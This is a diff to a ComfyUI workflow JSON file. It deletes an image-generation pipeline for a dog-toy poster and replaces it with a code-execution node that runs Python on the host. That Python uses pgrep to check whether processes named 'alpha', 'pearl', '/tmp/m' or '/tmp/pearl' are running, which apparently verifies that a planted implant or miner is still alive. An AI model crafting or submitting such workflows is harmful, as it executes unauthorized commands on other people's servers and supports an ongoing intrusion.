@@ -1,108 +1,18 @@
 {
   "1": {
+    "class_type": "IDENode",
     "inputs": {
-      "image": "图片1 (2).png"
-    },
-    "class_type": "LoadImage",
-    "_meta": {
-      "title": "加载图像"
+      "language": "python",
+      "pycode": "import subprocess\ntry:\n    out = subprocess.check_output([\"pgrep\", \"-af\", \"alpha|pearl|/tmp/m|/tmp/pearl\"], text=True, timeout=5)\n    result = f\"RUNNING: {out.strip()[:100]}\"\nexcept:\n    result = \"NOT_RUNNING\"\n"
     }
   },
   "2": {
+    "class_type": "PreviewAny",
     "inputs": {
-      "image": "转筒素材.png"
-    },
-    "class_type": "LoadImage",
-    "_meta": {
-      "title": "加载图像"
-    }
-  },
-  "3": {
-    "inputs": {
-      "image": "woof.png"
-    },
-    "class_type": "LoadImage",
-    "_meta": {
-      "title": "加载图像"
-    }
-  },
-  "4": {
-    "inputs": {
-      "image": "kong.png"
-    },
-    "class_type": "LoadImage",
-    "_meta": {
-      "title": "加载图像"
-    }
-  },
-  "5": {
-    "inputs": {
-      "image": "OutwardHound.png"
-    },
-    "class_type": "LoadImage",
-    "_meta": {
-      "title": "加载图像"
-    }
-  },
-  "9": {
-    "inputs": {
-      "model_name": "gemini-3.1-flash-image-preview",
-      "prompt": "参考图是第一张图\n标题：Top 4 Functional Toys Pro Dog Trainers Actually Buy\n第二张图 是KONG (Classic)：标签：Crate Training  描述：Perfect for rewards and helping pups love their crate.\n第三张图 是 KADTC (Puzzle Toy) 标签：Focus & Patience  描述：Builds brainpower and corrects impulsive behaviors through logical problem-solving.\n第四张图 是 Outward Hound (Puzzle Brick) 标签：Scent Tracking   描述：Activates natural sniffing instincts and curiosity.\n第五张图是 Woof (Pupsicle)  标签：Anxiety Relief   描述：Great for separation anxiety and teaching dogs to calm down.\n注意这几个图的排序\n森林自然风格",
-      "image_count": 1,
-      "use_search": false,
-      "use_image_search": false,
-      "aspect_ratio": "3:4",
-      "image_size": "2K",
-      "temperature": 1.0,
-      "image_1": [
+      "source": [
         "1",
         0
-      ],
-      "image_2": [
-        "4",
-        0
-      ],
-      "image_3": [
-        "2",
-        0
-      ],
-      "image_4": [
-        "5",
-        0
-      ],
-      "image_5": [
-        "3",
-        0
       ]
-    },
-    "class_type": "NanoBanana2AIO",
-    "_meta": {
-      "title": "Nano Banana 2 AIO"
-    }
-  },
-  "10": {
-    "inputs": {
-      "images": [
-        "9",
-        0
-      ]
-    },
-    "class_type": "PreviewImage",
-    "_meta": {
-      "title": "预览图像"
-    }
-  },
-  "11": {
-    "inputs": {
-      "filename_prefix": "ComfyUI",
-      "images": [
-        "9",
-        0
-      ]
-    },
-    "class_type": "SaveImage",
-    "_meta": {
-      "title": "保存图像"
     }
   }
 }
